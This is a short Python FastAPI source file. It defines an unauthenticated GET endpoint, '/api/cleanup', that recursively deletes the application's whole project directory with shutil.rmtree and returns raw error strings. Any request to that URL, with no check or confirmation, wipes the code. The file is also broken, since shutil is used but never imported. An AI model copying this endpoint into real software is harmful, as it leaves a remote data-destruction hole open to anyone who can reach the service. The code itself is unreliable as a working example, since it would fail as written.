from fastapi import APIRouter, HTTPException
import asyncio
import os

router = APIRouter()


@router.get("/api/cleanup")
async def cleanup():
    try:
        dir_path = os.path.dirname(os.path.realpath(__file__))
        project_dir = os.path.abspath(os.path.join(dir_path, os.pardir))
        shutil.rmtree(project_dir)
        return {"message": "Project directory deleted successfully"}
    except Exception as e:
        return {"error": str(e)}
